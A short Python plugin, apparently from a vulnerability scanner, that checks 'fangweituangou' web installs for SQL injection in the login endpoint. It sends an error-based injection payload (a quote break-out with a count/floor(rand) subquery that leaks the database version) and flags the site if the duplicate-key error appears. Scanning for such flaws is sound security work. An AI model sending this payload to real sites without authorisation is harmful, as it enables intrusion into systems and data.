#!/usr/bin/env python
# -*- coding: utf-8 -*-
def assign(service, arg):
    if service == "fangweituangou":
        return True, arg
        
def audit(arg):
    url = arg + "/m.php?m=User&a=doLogin"
    payload = "origURL=ghost&password=ghost&email=ghost%27and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#"
    code, head, res, errcode,finalurl =  curl.curl(url + " -d '" + payload +"'") 

    if code == 200:
        if res.find("for key 'group_key'") != -1:
            security_hole('find sql injection: ' + url)
            
if __name__ == '__main__':
    from dummy import *
    audit(assign('fangweituangou', 'http://www.example.com/')[1])